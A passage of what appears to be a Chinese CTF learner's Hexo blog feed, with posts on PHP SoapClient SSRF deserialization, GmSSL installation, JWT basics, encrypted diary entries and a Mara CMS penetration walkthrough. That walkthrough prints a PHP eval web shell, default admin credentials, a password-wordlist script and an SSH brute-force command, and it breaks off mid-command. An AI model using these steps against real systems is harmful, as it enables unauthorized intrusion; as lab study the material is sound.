class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serializez</span>(<span class="variable">$client</span>));</span><br></pre></td></tr></table></figure><p>netcat-win32-1.12</p><p>拓展：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">soap是什么</span><br><span class="line">1.soap是webserver的三要素之一(SOAP,WSDL,UDDI)</span><br><span class="line">Web服务的三要素通常指的是：</span><br><span class="line"></span><br><span class="line"><span class="code">    SOAP (Simple Object Access Protocol)：</span></span><br><span class="line"><span class="code">        SOAP是一种基于XML的协议，用于在Web服务中交换结构化数据。它定义了一种消息格式，使得不同的系统能够通过网络进行通信和数据交换。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    WSDL (Web Services Description Language)：</span></span><br><span class="line"><span class="code">        WSDL是一种用于描述Web服务的XML语言。它提供了Web服务的公共接口的详细描述，包括服务的可用操作、输入和输出参数、消息格式以及如何访问服务的网络地址等。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    UDDI (Universal Description, Discovery, and Integration)：</span></span><br><span class="line"><span class="code">        UDDI是一个用于Web服务的目录服务，它允许企业注册自己的Web服务，并且允许其他企业发现这些服务。UDDI提供了一种标准化的方式来发布、查找和集成Web服务。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">这三个要素共同构成了Web服务的基础架构，使得Web服务能够跨不同平台和语言进行交互。SOAP定义了数据交换的格式，WSDL提供了服务描述的标准，而UDDI提供了服务注册和发现的机制。通过这些技术，Web服务可以被创建、发现和使用，从而实现不同系统之间的互操作性。</span><br><span class="line"></span><br><span class="line">更容易理解的方式，我们可以将Web服务的三要素SOAP、WSDL和UDDI比作一个餐厅的服务系统：</span><br><span class="line"></span><br><span class="line"><span class="code">    SOAP（服务菜单）：</span></span><br><span class="line"><span class="code">        想象一下，SOAP就像餐厅里的菜单。当你走进餐厅，服务员会给你一份菜单，上面详细列出了所有可供选择的菜肴以及它们的描述。同样，SOAP是Web服务用来告诉其他计算机系统，它能够提供哪些服务，以及这些服务需要什么信息来执行。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    WSDL（服务介绍）：</span></span><br><span class="line"><span class="code">        WSDL就像餐厅的介绍手册。当你想知道餐厅提供哪些类型的菜肴，或者你想了解如何点菜，这本手册会详细告诉你。在Web服务中，WSDL提供了服务的详细描述，包括服务能做什么，如何与服务交互，以及服务的地址等信息。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    UDDI（餐厅目录）：</span></span><br><span class="line"><span class="code">        UDDI可以比作是一本餐厅黄页，它列出了所有可用的餐厅以及它们提供的服务。如果你想找到提供特定菜肴的餐厅，你可以查阅这本黄页。在Web服务的世界里，UDDI允许人们查找和发现不同的Web服务，了解它们提供的功能，并找到如何访问这些服务的方法。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">通过这个例子，我们可以将Web服务的三要素想象成在餐厅中点餐的过程：首先，你通过黄页（UDDI）找到你想尝试的餐厅；然后，你通过介绍手册（WSDL）了解餐厅提供的服务和如何点菜；最后，你使用菜单（SOAP）来实际下单，享受服务。这样，不同的计算机系统就像顾客一样，可以通过这些“要素”来发现和使用Web服务。</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/en/extensions.alphabetical.php">https://www.php.net/manual/en/extensions.alphabetical.php</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hd</title>
      <link href="/2024/06/22/hd/"/>
      <url>/2024/06/22/hd/</url>
      
        <content type="html"><![CDATA[<p>​国密：SM3，kali安装</p><p>1.git clone <a href="https://github.com/guanzhi/GmSSL.git">https://github.com/guanzhi/GmSSL.git</a></p><p>2.解压（如果需要）</p><p>如果你下载的是压缩包（如<code>.tar.gz</code>或<code>.zip</code>），你需要先解压它。但如果你使用的是<code>git clone</code>命令，则不需要这一步，因为Git已经为你处理了下载和解压的过程。</p><p>3.进入源代码</p><p>cd GmSSL</p><p>4.编译配置</p><p>.&#x2F;config –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;gmssl –openssldir&#x3D;&#x2F;usr&#x2F;local&#x2F;gmssl no-shared</p><p>5.make编译</p><p>make</p><p>6.安装</p><p>make install</p><p>7.配置环境变量</p><p>安装完成后，为了让系统能够找到<code>gmssl</code>命令，你需要配置环境变量。这通常是在你的shell配置文件（如<code>~/.bashrc</code>或<code>~/.bash_profile</code>）中添加一行来指定<code>PATH</code>变量。打开文件并添加如下行：</p><p>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;gmssl&#x2F;bin</p><p>然后保存文件并运行<code>source ~/.bashrc</code>（或对应的shell配置文件）来使更改生效。</p><p>8.8. 验证安装</p><p>最后，你可以通过运行<code>gmssl version -a</code>命令来验证GmSSL是否成功安装。如果命令能够正确返回GmSSL的版本信息和其他相关细节，那么说明安装成功</p><p>二、py -m pip install gmssl</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.21记录</title>
      <link href="/2024/06/21/6-21%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/06/21/6-21%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bfcfac1245cf0af77ad1172f0f92015c596e6080fbc6837516ec85ba30f88dc0">0ca2b35c8261f8c795eedabdc3bf52f2fcf7f46fbea3a83a0130a288c3b1304624472da75bd1d6dfb8577b79c0a3e789076eaae91cf2480d961be51266a2d1e9057c802410f4594de4ebfcfc5e3e94f03ea7ad123bb51f2e7418297f5d27bd306f863a0a52597183d9b3e50db3fd5784228a00b568149a38a3945736f717f6f14e05de014718a0275a8198d02c409a4ab3287da4ccfaac0b75fdc4a31d9b9ddaf7ecb5d1db90bb012a38030d59a91def8fe9997b987db759a52364527713e34fa677ee23178f3cb296548de80ba70cc9ac0bbe4a09c7303fd98f5f8962f0335111efd9c8168df702efefef672e6609198ac7ad287e9f9efd6b5d9bc7997298cf3d224dbc78d482bf00a7a6522c1b73e0473bda70516d7a8aae61bfec4ceef718854d855bcbe3a3246d6e1ff2142e69f48efa75ac26a849dd56ee45fc00e83afa7450726231b0da1c552ad88ac150e6f8689563d96a490c2f673faa3782f1b67db2f39102476ad5209f349b54360ed693ea113a25cc6cd271e5e35b2067734489bc2392eef0120654e33db890e98bc9dcaeec6b5082807cab5b3fd4505846b1588d8943ea0b1b710e649f31d0b9958472ca7efe932413e8817209b9168a54ec1c92abffc90d1b2668c1a50805876ce5f3e5132f4c517149d384e11459c5f1f1184c534149a44bb6df56351c864dd042823c55181845ad55a8c3599e6055da88f239c1b17ebdb90b8c8e63e203ebe60ddcd3cb436a169a757dc538e9d15e8c6e1c5802cef6eca40bd140462bc7b751b759ab3dd15d70acd3dc775ae0c0e8973122397633eb81c8fc1658112ecde5df432a1476bd5c2345f739132d1d60de2a19e95ca7afa58f10a79395f5bcdbb362662dca0e931f75b6f2bf6a7652cf376e522a4f8e48b997d94ef6686c0becc650fbf2384c4de11a7ec873cafff0c86eebd487cdc41b0382253797ec7e859ae4ce892b954660d759ffc91ad0de905c3e2b7391e3d6d8cfe695337f5e1ab0452d70baa690431209576ec60cd6b13ee8f1329d8fcc5cdebac992ca80bade9a693e068611ae3ad89fa53f3ae04f24650b62240d6a62d1d8d5a114f9c87e50513737d3b58ee7ad0957d72989ace36fbc3bdefc1cbfe96d5904c59893f37b99afd7153db676d64681ef84c1b046ba3f07086b5868b7c7e35c0afa4bd478b5d3567738aca18bea2458dbfc5eb46a25d74c199fa0fac0c84db655b3a02b6693611baa320054646dea3e8ea21a97d06e2ba3d131c2d2889245c2dbd4817c55ec6f8c3d8d132e2d7514075818a2c95f0a2d58dba97700943d96ad882413181077f06adc2b4cc3d7fbd032eb5a6e1929b51c58d630ec23379211a2ac34d427e382d558467d50497bd8baf2858b8c935effe088eb0266ea4698b2c67952014d4a0a1834bfb4e9ea34de166ec1c71d0de4250d3316997e9666a1ba08b6a3de494aeb17261f81596b73c2737f66d78755ecd7c66fefd5f5f87ca1ed184f23ae3b0dc73cd7e4a5e4dc9c1315ce1bc00694e87f269bd37a73a9df3483357807d2738d2d18842aef0e61215ce2973326ed370672f65d42d43c4e10557b4ea1cc2fdcd9e449f3d86ca0b4d1dd80c70591b19f4a8ac4cc6231a16404fa63e7469b9e454949890e616d96ddaf17b0cb61bdc4240d34ae6e6c5d94d12b874a6d13d8c473a7a0748218c2e828236e6b7608be52a737b53c05ce6da9bad1e5dd6b226b6f0758532ac60e78a0a8133c846a7678a403c59790368ed41dd415116a54577b587c30c3f37df39559ec9d060472f37ac8070237e0b5c384c5746f28ecb081b2ff6c9c03e412a52eeb70823cd9994a080babb4ced61e0c77eb5aeabf1462da1af8d78353fda81a143017312d081645b42c798002a33757ea42ae9cf5486637c08a9c644c77602dee921f87a5715ac077630840e8bbb19387a371de255007b7848fd303a051c10074a9e8627ef0633ca1df6011a451ff5a904c1c77eedac53defaf1938a87ac6f56524df5466fe29f71f55c1fac0828d11b55cab0f3b7ce3e5d324be1f264628d158978bf9350c465cd364a8414b34692a3e3ec4c7f7543400e8509d63d4900bbbb32d446f1213727de4e202f4fce99e18008e7d87fbd673bacf24bb495e0641c6da32c19ed72decafcddd2b06a94f9e6862f39f2584b401ae77133e7d451bd0f0730343c40e9d9d397ff9d4a55e395f2ec0c0380dd82a8523036b4d5aa6c0cfedaa83fe53d273159afe897b55c6af438bf05d381200f787f3ed9683de69c2e3ce2aa8471e98c327e2adf8de0316bb4ab5715958d35ddfda89c0315358a22e3c3ecb535741f67367df219602f754652204230953a8879045b77c5ee3cce89d6c6db9e2023f62e682ddace551b0851265999347e8096976a0ddb724cd6e5a5fe8755906316bf544717e6f9cc916dc2e4ba06703336d054b8fcdb984aec47f64a8716cf60ef5c384278f58e105a844cfcca84f2f3c76f8bf7ae801da548bd5774fe413b57e7e9216cbaaca4638dd9bf33559d23a7e3694d4962a45b25d1a510d270351d69488b986373ecb1984774263835fd8de78ffb8036e3d6b1649ebf6894e71eecc0dc1caee5b5c0fe3177d5c8a23ff2f828c63e8cbdeb9bc20f4da33f5d0345f660c48e34f8dd4454adf1f99f472a3e7c0a6d0e5c6e188eede76a3afd7296bbd40ce850f4e787f90cc631a0ed919339492c0a79bcb269c9ae74d08c894078f3f09c046169a1e487ce33c4e8121097d95139dbbbfdf0b2279285746ebee3e78cf660a78531aa8020e264586ba7cb72948e20584712baa05efaeb8e7cab865b2a65b689ac9c2ebf6dc720d64a34a8ff3144ae84a45cc32fa07e7c0b47f10b4876527abc4d8530bfe09cf0965eab90de0d30d7e3c38385ef082b70a09a56db88111a79246633eccd1c1305cdca864a9a7b680a3e5efeb6415b68e92fd9806f59eaecdcc6b46a85b52ab2db41a6f010e46d4c34df8af664288c4f44802169d44da1e37389bb071e5e5798c96c121914e7c09cfba6ea2ced76b67bd30a181f6fb50c15d466b9c8c64f52cf1656c0eb4a326c79fa7beb725f1078033ec12258d72744c3b518e27e0309e569556e2751f1e2e6a13aa4c2d855a6b3776954779c77efa3ed9c026b7565cef5568478c0331891dc55efbe92700310d2bf854735a252b9dd723eed76ec39eb70770ffd0de28f6b3044fdbc202114a041abbc1836283ec925457936064465a2c7490ad3c59553444cb13bfe8fb4a92b8ab5612e1018bc3e43e56bfc7c961f601c6da55daf2cd1b5cc91bb4a48f57b7c30f4980295f21ce75a60e8518c0ab537cbc06fa67616f9b254d92b256cf83a55ae856096ddb4367f057a49faecd7d155abf8f1c7f8023a920150b9e48424f03eb9df14e8ae15e64dc6f8a3f8f99f84cb23a1fe696253df16388e28e48ed2728d8524cb7593a02a4a13b8df0547cc1d827872151aedfb16af6dd9dba5174a36f53a3fd82294a2fd13c2c02467b4e769bd67a5e8aca13dc593464323c4dc1d5cb63c902012a68ac9a97e6cc4c577e71bd3d7d04f0d4693a7b041a486885f2b3d127161186f30f0f822b4f67d32d8b4723ee562813873cc1e5fc05994f0cc9e7e8f537b8038d729d614f9bcf303607b53a2da56fd333ab3f374509cbd4b5340fd4b51b3f32462b393be2a131d664ff9ff3e3bf0951a819c4a848847a2dbe401a1aaf74b76267165122196b3406e5912f2678579d6f3773bf5c9b4587c982ef8d21ef0b305a3d4827b87a730f77cfbf76d6998460937e15880057c60f1802059ea902d8488ab70270ecc3630d7b4083c8840317b995cde72a2340afd28b28</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>感想</title>
      <link href="/2024/06/16/%E6%84%9F%E6%83%B3/"/>
      <url>/2024/06/16/%E6%84%9F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="628780cc97316245d35238b916bf369723e5e21b11faa9a045b2e0b76b24b47a">0ca2b35c8261f8c795eedabdc3bf52f2fcf7f46fbea3a83a0130a288c3b1304689d4ab47e9c1236efacdfb0a8c456a5db1b7c09e28dbe462ff65cc544e858b1b6115af8e417bcb2c994d51a13418191996ff3ffd8e73b987827822884170e7f53393635460481f99c678c37630fbafb2e45a8e3355ea9400bb85393a8c3cd3e4bc996e6a49267a3ed987f4a38fea2ebec1fade719eaf21b266d74dc13e7527043caafcb73615a7e4d2570b54d200a1470f61f36c3bd6527eebdd7b0610192b42bed2649a28e7950f2069964b75a88584a82c094d3ca0454e7e68cfad5c03e144035222b5c3395e602072acca4225d131aa037ae878640a01a0dbabd344216c091f7970d269d2d0c4f60e1b51ffc4f0e33ccee101e4db27137d754c2658cba2d3642bd770b962fb93215f8819977801de67d1c867e865e7eef73db478645c76ea9a6ece145c833f877dd091679f2d2e2cf75ea4534de36c043cb11a605d5a41dd868662f1fc2f378c7b2713021286d40c7c6fd847351b2ed2c8af86650da88d728d77648a0e57feb97485508669a8f646914f7f6f49a19d366fda07056b95645a9e15e395c779246e58e3a6550cac2086286200b2e7cd8786ae8fffda08008eb034017271affdd25564eff874a320606b2801cc62c32113efde83e9aee6fef5e7a645613b040ccc986b8a9f7c76fd974ea00a5f30b2892117e132cb3ce01574b90ced251437c8c485dbbc76645c5bd1fc5a054fa3d9e320103691bb8bcc9dd4dfb3296f5c36bd6d6132b25ba2cd38e2f556e0188b1b3ea2d222a8179e1a9fc427c8d9b086f3a975fc5b0c2bacaff25ad4d4725262887701d1c9827a065fba06a7b76f692331ca8db53f959e650af01d324bd8cd99667f92a34ff6c3b5dd273e975b6688333e3b65ad2c253b9a242280df16c2b24a415466b63e99cecd33ba993e0069bb320f013cfc84c930418f9f7dd08e2919b4224d43262796cc9df8a2f17bd5be1dc4ce3bb8d6f0a1abc70c5799c14e590b0445cc820653a6956a7cdd75f39da9e3e0b7f34d2de958f2e71e54ea0b714ee38b0954f46014b4e39442af8879adf2d48c2fa8443f93e89ba7c603d4659de5276db7804d67681711a0d2e9f2999bce7ed2fd9af6f50bcec1c3a01cb85f14eda1f934438cf5d074be7739c5941f201db181fb0e6e9db03d670191b6f8b1078b173ef4dbcb7169b6d8e8bb897356cd4d4bb584539ede15d6a9b346bca635b3ca54e7255c549f548ba4800140c4459a7cb42727a0ca710f5ffabeeeb35c64f148cae1d918997768f5e51269a5d22de2510d91e514cea6d70d9d80c19a14eeba4ad134ae4d93b321077aabbb94efa5ab4834ca66bb266be9a3f0242cc8892cd2dd1c5856e1838bc2b3ccc1be4a8691d60758de2bdc75a43241dbd60839e257e555d1633b1fd6587d2ec3af5bf345e61e365342c2e8a41e51f2f4b2e54b872c02d67d5251fffe51c82a7cfacfd55924f7a703e04a9781fbd0808abdf00356a7b85eefb591c07911eb01c886826c587b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jwt篇</title>
      <link href="/2024/06/14/jwt%E7%AF%87/"/>
      <url>/2024/06/14/jwt%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​jwt全称是JSON Web Token。<br>​通俗地说，JWT的本质就是一个字符串，它是将用户信息保存到一个Json字符串中，然后进行编码后得到一个JWT token，并且这个JWT token带有签名信息，接收后可以校验是否被篡改，所以可以用于在各方之间安全地将信息作为Json对象传输。</p><p>​JWT由3部分组成：标头(Header)、有效载荷(Payload)和签名(Signature)。在传输的时候，会将JWT的3部分分别进行Base64编码后用.进行连接形成最终传输的字符串<br>JWTString &#x3D; Base64(Header).Base64(Payload).HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)</p><p>原文链接：<a href="https://blog.csdn.net/Jayjay___/article/details/132062263">https://blog.csdn.net/Jayjay___/article/details/132062263</a></p><p>学习链接：<a href="https://xz.aliyun.com/t/2338?time__1311=n4+xnieDqWqxg0D9DBTroGkYDCDum2or0ABxYwD&alichlgref=https://link.csdn.net/?target=https%253A%252F%252Fxz.aliyun.com%252Ft%252F2338">https://xz.aliyun.com/t/2338?time__1311=n4%2BxnieDqWqxg0D9DBTroGkYDCDum2or0ABxYwD&amp;alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F2338</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/112525267">https://blog.csdn.net/solitudi/article/details/112525267</a></p><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>​先抓包，然后对Cookie里面的auth利用在线网站解码<a href="https://jwt.io/#encoded-jwt%EF%BC%8C%E5%BE%97%E5%88%B0">https://jwt.io/#encoded-jwt，得到</a></p><p>特征是eyjxxxx.xxxxxx,只有两端的jwt，没有签名部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iss 签发者是admin</span><br><span class="line">iat/nbf: 签发时间是1718375037</span><br><span class="line">exp: 过期时间是1718382237</span><br><span class="line">sub: 面向用户user</span><br><span class="line">jti: jwt唯一标识符</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.14浅记</title>
      <link href="/2024/06/14/6-14%E6%B5%85%E8%AE%B0/"/>
      <url>/2024/06/14/6-14%E6%B5%85%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a85ea882bb7335f08e032cc82a52427e9e7f01244356ebf8d6bd933101a7aaa7">0ca2b35c8261f8c795eedabdc3bf52f2fcf7f46fbea3a83a0130a288c3b1304633190f8d59fa62ddd4c9a8013bde23e29e00f31f8ea88c4bbebe73e3531f309f46430d4dbe3c9e8382071a0de4410bda5d13dcb721969e706a9db59c78b99e0d05fde3300d3cceee7038402d58a4cc67b1fb2c66d9bd82b7537ac2b3848fab628769bbdc96923263806a021418f1d99f30c91932706451affa941a57c3118ed1a558c272378830a0e68889f64b2c79333c9c283584cb2e124c5a2af43c7223d0734fe09f3f844092190b730a1b659c17931fd8bbb5a3f825d00b4c8979fc935d78de09f580760903a9ace6550402582985856fd9043c967c8c7164b6bc66d99acfbf13a3b058e91ec61e9156aad61eb1f9cb32b6547bd6096567bbacd065ef25a988919773be9daa7b1bc921d6fb84d8cad8b91ab9655a42a07ef663aec76a1dd6c80c958b9304eb83e947b8b16096a78a3d2d04a96dbe58133b782d1756d8f6b2fa435737a40de919eb88025394c079ee4a31c071fb347be20e8cd5d6b1c759ee7e3fd66828915ce8e2f7f71f20c93f03e17fe060087ff4472ea6731937051e4381cb5223c78ff48f9f14ed342bb12c7462589fda38fafd704b4605ad5002ae07f6b951900a7960019e303a8178c0f6ee9f6e50646ff6a9002dcaa91876dc8fc496a4a8ee506c6b9105e07592db62896350d67c60f142d9247f5797ad6b6214eb801ca896637eaa107dddab18e449f6a3d54d6f58149dc23536e230e7e405c1379c59dffb50908424209b148824cbab42bac3fc38492c2538c00679a0d3dc4b5b700e0144b5c48ca41a980ab4797701d11af0d1eaeb1c081632a353d039ab38679d3e6e7f93679bcc5cede8765c79b278df3c9b100bdc6c80cd686dc3a7dc2a4645c2b0160b6d006148ad810b6afb8fc568949ce72342ff53206a125e70fa00cb44205d73d8f41746240ae9ce98a4749bf2cd99f690a292b38678b0f63b8717614c03ebfe669cadd5e648043ede72e2eee9afa7422ba6b50958c21ae84bf955f9f22aa57a33d1e86e8160edd0f2f270ab91e8aeeb782eb63cccc8ebc6186026b1e36cbd94b3c0bd6a21c37bc47763c11d9f7176718c34970a0446cb6514d3744c76fe6c7b88f17e95dc0fea985a58211bf6b292593e05722bfee6c1d52fff109496955040dbe0d7ea2a632ba6e5756552823f9ebf5ca3a1bed67908cfad80d03816bfc0a527e404c7d22a9427592beef280ef3fb120513bc157ef065a3fdd277e92f1271c908f27ac82d3bdc613123676b5c4c9b95c970d57b893da47dc15144842cfad6fdb0dff19c66a8e8ef1e4c8dd0ec072d0ef01d13f2621e8d0869a518a7148b9081d2106887cbc2012bb72bb81af5df36df46e2f91efeb8509fa970bb06df018a902f1a3f86c871383e3057942dc4dc33c68cdcb668814b87ab1473716463e0464b212673c995215b090e91e2a7114a0d8eaf64fad7a4ad25f0009f80c343a8fb180f547b9c243a54cc2a061e14d2db21271ea057199d75ec60fd3112580212ebec4edf4a702d80a4b00af01c1b4483925d03279fdbaf76d869114372ab95a0552d3633c7e9eebaabf1dd27c94704f48c2ba3ca0f2d4cd953631dccfe238d80e14383d80501be13c284b062632c9a04752385d8d4f7212578576c5f27c9f861e5075f38bdc98604e4ecaab619afbebad88490d28474877f8c7841c52439b870df734647d0d86bdbfb6df94d55165516659a338e01180dc449c485d738e4856f471ecb3fa5dee1def1c02f4b50b2ee44f4d240354570a658f547d0be3313de349ed19b900f90b07017cfdb5479c3026e2638802641f035a2c17de3f4e3583fe25398cc5c29caedfa36008374a6d7db9c5db5e3ffa6b46e594c6d930bfecb8e9e8bdc8ce25f8d070aa64fe46226ba20f2fcab28c155a433cd3435e0ce68886317e7b3932aeb27538d25d544c76</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句话</title>
      <link href="/2024/06/11/%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
      <url>/2024/06/11/%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
      
        <content type="html"><![CDATA[<p>​真正要取得大成就是需要持续不断的认真。而持续不断认真是不需要打鸡血的，因为努力可以很平静的乐在其中。(●’◡’●)</p><p>​怕什么真理无穷，进一步有一步的欢喜。</p><p>​行动力不足的真正原因是选择模糊。</p><p>​想做的事，不分时间也不分天赋。</p><p>​有价值的东西值得我们慢慢去做，值得花足够的时间去做。</p><p>​原来答案真的是能够在行动之中慢慢找到的，我真的，哭死！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 一句话 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透复现</title>
      <link href="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><p>​搜索相关<code>Mara cms</code>,发现一个漏洞，文件上传，远程代码执行,<a href="https://cloud.tencent.com/developer/article/2277522">https://cloud.tencent.com/developer/article/2277522</a></p><h2 id="二、web-flag"><a href="#二、web-flag" class="headerlink" title="二、web_flag"></a>二、web_flag</h2><ol><li>访问Mare cms</li><li>admin:changeme 进行登录</li><li>访问 <a href="http://target/codebase/dir.php?type=filenew">http://target/codebase/dir.php?type=filenew</a> 上传web shell</li><li>连接web shell</li></ol><p>一句话木马:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-08%20214016-1717859777111-3.png" alt="屏幕截图 2024-06-08 214016" style="zoom:50%;"><h2 id="三、user-flag"><a href="#三、user-flag" class="headerlink" title="三、user_flag"></a>三、user_flag</h2><p>​在<code>/home</code>处可以发现一个用户，<code>d3f4ult</code>，继续进入，查看<code>user_flag</code>，发现<code>permission denied</code>,继续查看<code>notes.txt</code>,(后半句的提示sudo提权可以用vim)，发现一段base64编码，解码<code>cGFzc3dkWzAtOV1bMC05XQo=</code>    —&gt;   <code>passwd[0~9][0~9]</code></p><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-08%20214507.png" alt="屏幕截图 2024-06-08 214507" style="zoom:50%;"><p>爆破密码，在kali中先生成一个passwd<code>[0~9][0~9]</code>的字典，然后使用工具Crackmapexec爆破</p><p>vim 是一个文本编辑器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入：i 或者 a</span><br><span class="line">保存并退出：按esc键，然后:x保存并退出</span><br><span class="line">执行命令: 冒号</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim pass.py   </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;pass&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        passwd = <span class="string">f&#x27;pass<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span>&#x27;</span></span><br><span class="line">    passwd += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    file.write(passwd)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pass.py</span><br></pre></td></tr></table></figure><p>生成好字典，开始爆破 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ssh -u d3f4ult -p pass --port xxxx 